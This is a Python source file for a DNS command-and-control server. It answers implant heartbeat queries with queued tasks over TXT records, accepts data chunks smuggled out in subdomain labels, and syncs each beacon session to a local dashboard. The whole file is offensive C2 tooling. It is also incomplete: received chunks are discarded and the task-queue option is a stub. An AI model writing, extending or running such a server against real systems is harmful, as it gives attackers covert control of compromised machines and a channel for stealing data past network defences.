import base64
import json
import logging
import socket
import sys
import urllib.request
from dnslib import DNSRecord, QTYPE, RR, TXT

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(name)s: %(message)s")
logger = logging.getLogger("dns_c2_server")

# Configuration
LISTEN_IP = "0.0.0.0"
LISTEN_PORT = 53
TARGET_DOMAIN = "c2.localhost"  # Target domain zone
BACKEND_API_URL = "http://127.0.0.1:47431/api"

# Task queue storage for connected sessions (Session ID -> Task Dict)
TASK_QUEUE = {}

def register_beacon_with_backend(session_id: str) -> None:
    """Pushes DNS-registered sessions directly into the FastAPI backend dashboard."""
    try:
        url = f"{BACKEND_API_URL}/beacons/register"
        payload = json.dumps({
            "session_id": session_id,
            "transport": "dns",
            "os": "Linux-Kali",
            "status": "active"
        }).encode("utf-8")
        
        req = urllib.request.Request(
            url,
            data=payload,
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        with urllib.request.urlopen(req, timeout=3) as resp:
            logger.info(f"Successfully synced DNS session {session_id} with backend dashboard.")
    except Exception as ex:
        logger.debug(f"Failed to sync session with backend: {ex}")

def handle_dns_request(data: bytes) -> bytes:
    """Parses incoming DNS packet, processes subdomain payloads, and builds TXT response."""
    try:
        d = DNSRecord.parse(data)
        qname = str(d.q.qname).rstrip(".")
        qtype = QTYPE[d.q.qtype]
        logger.info(f"Received DNS query: {qname} [Type: {qtype}]")
        
        # Initialize reply
        reply = d.reply()
        
        # Check if the query targets our C2 domain structure
        if TARGET_DOMAIN in qname and qtype == "TXT":
            parts = qname.split(".")
            # Expected structure format: seq.total.chunk.session_id.c2.yourdomain.com
            # Or heartbeat format: heartbeat.0.0.session_id.c2.yourdomain.com
            if len(parts) >= 5:
                action_type = parts[0]
                session_id = parts[3] if action_type == "heartbeat" else parts[3]
                
                # Register/sync the session with the FastAPI backend
                register_beacon_with_backend(session_id)

                if action_type == "heartbeat":
                    logger.info(f"Heartbeat received from session: {session_id}")
                    # Fetch queued task or default to 'sleep'
                    task = TASK_QUEUE.get(session_id, {"action": "sleep", "interval": 5})
                    task_str = str(task)
                    reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(task_str)))
                    
                    # Clear task after sending so it doesn't repeat infinitely
                    if session_id in TASK_QUEUE:
                        del TASK_QUEUE[session_id]
                else:
                    # Data payload chunk upload from beacon
                    seq = parts[0]
                    total = parts[1]
                    encoded_chunk = parts[2]
                    logger.info(f"Received chunk {seq}/{total} from session {session_id}")
                    
                    # Acknowledge receipt
                    reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("ACK")))
            else:
                reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("Not Found")))
        else:
            # Fallback for standard/unrelated queries
            reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("Not Found")))
            
        return reply.pack()
    except Exception as e:
        logger.error(f"Error handling DNS packet: {e}")
        return b""

def run_dns_server():
    """Starts the UDP server loop for DNS C2 traffic."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((LISTEN_IP, LISTEN_PORT))
    logger.info(f"[*] DNS C2 Server started on {LISTEN_IP}:{LISTEN_PORT}...")
    try:
        while True:
            data, addr = sock.recvfrom(512)  # Standard DNS packet buffer size
            response_data = handle_dns_request(data)
            if response_data:
                sock.sendto(response_data, addr)
    except KeyboardInterrupt:
        logger.info("[*] Shutting down DNS C2 Server...")
    finally:
        sock.close()

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--queue-task":
        pass
    else:
        run_dns_server()


